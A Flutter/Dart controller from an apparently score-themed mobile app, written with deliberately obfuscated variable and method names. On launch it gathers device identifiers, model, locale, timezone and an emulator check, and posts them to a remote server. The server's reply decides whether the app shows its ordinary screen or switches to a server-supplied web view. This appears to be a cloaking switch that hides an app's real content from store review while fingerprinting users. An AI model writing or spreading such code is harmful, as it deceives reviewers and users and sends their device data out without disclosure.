import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class ScoreRateLogic extends GetxController {

  var hqzprunt = RxBool(false);
  var timour = RxBool(true);
  var zowimnc = RxString("");
  var jaleel = RxBool(false);
  var donnelly = RxBool(true);
  final uvxhkcbie = Dio();


  InAppWebViewController? webViewController;

  dynamic ltjirkqvao(){
    final mdjvlkn = InternetConnectionChecker.instance;
    final vybdezlj = mdjvlkn.onStatusChange.skip(1).listen(
          (InternetConnectionStatus kzdtwseay) {
        if (kzdtwseay == InternetConnectionStatus.connected) {
          gmuzojek();
        } else {
          Get.toNamed('/score_check')?.then((_){
            gmuzojek();
          });
        }
      },
    );
    return vybdezlj;
  }

  Future<bool> qacxfpwmn() async {
    var leotqvc = await InternetConnectionChecker.instance.hasConnection;
    if(!leotqvc){
      Get.toNamed('/score_check')?.then((_){
        gmuzojek();
      });
    }
    return leotqvc;
  }

  @override
  void onInit() {
    super.onInit();
    ltjirkqvao();
    gmuzojek();
  }


  Future<void> gmuzojek() async {

    var jadoflehmw = await qacxfpwmn();
    if(!jadoflehmw){
      return;
    }

    jaleel.value = true;
    donnelly.value = true;
    timour.value = false;

    uvxhkcbie.post("https://code.nowlp.com/yswdlthup",data: await kzewljvaf()).then((value) {
      var xoehbcdu = value.data["xoehbcdu"] as String;
      var ydtjzf = value.data["ydtjzf"] as bool;
      if (ydtjzf) {
        zowimnc.value = xoehbcdu;
        dessie();
      } else {
        rowe();
      }
    }).catchError((e) {
      timour.value = true;
      donnelly.value = true;
      jaleel.value = false;
    });
  }

  Future<Map<String, dynamic>> kzewljvaf() async {
    final DeviceInfoPlugin fxcjltb = DeviceInfoPlugin();
    PackageInfo sbetlzr_seqibacd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gjplh = Platform.localeName;
    var elvorcdz = currentTimeZone;

    var rctj = sbetlzr_seqibacd.packageName;
    var avgfr = sbetlzr_seqibacd.version;
    var ruega = sbetlzr_seqibacd.buildNumber;

    var kwamu = sbetlzr_seqibacd.appName;
    var yafn = "";
    var hpbxc  = "";
    var fobs = "";
    var chaseHalvorson = "";
    var zackaryBoyer = "";
    var tristonMcCullough = "";
    var juliaMohr = "";
    var evanBergstrom = "";
    var aylinJerde = "";
    var salmaStiedemann = "";
    var elvisBeatty = "";


    var sgekbuy = "";
    var bayf = false;

    if (GetPlatform.isAndroid) {
      sgekbuy = "android";
      var aptvjoug = await fxcjltb.androidInfo;

      fobs = aptvjoug.brand;

      yafn  = aptvjoug.model;
      hpbxc = aptvjoug.id;

      bayf = aptvjoug.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sgekbuy = "ios";
      var rxjnewdua = await fxcjltb.iosInfo;
      fobs = rxjnewdua.name;
      yafn = rxjnewdua.model;

      hpbxc = rxjnewdua.identifierForVendor ?? "";
      bayf  = rxjnewdua.isPhysicalDevice;
    }
    var res = {
      "kwamu": kwamu,
      "tristonMcCullough" : tristonMcCullough,
      "ruega": ruega,
      "aylinJerde" : aylinJerde,
      "yafn": yafn,
      "elvorcdz": elvorcdz,
      "fobs": fobs,
      "hpbxc": hpbxc,
      "gjplh": gjplh,
      "sgekbuy": sgekbuy,
      "bayf": bayf,
      "chaseHalvorson" : chaseHalvorson,
      "zackaryBoyer" : zackaryBoyer,
      "juliaMohr" : juliaMohr,
      "avgfr": avgfr,
      "evanBergstrom" : evanBergstrom,
      "rctj": rctj,
      "salmaStiedemann" : salmaStiedemann,
      "elvisBeatty" : elvisBeatty,

    };
    return res;
  }

  Future<void> rowe() async {
    Get.offNamed("/score_main");
  }

  Future<void> dessie() async {
    Get.offNamed("/score_over");
  }

  @override
  void dispose() {
    ltjirkqvao().cancel();
    super.dispose();
  }

}
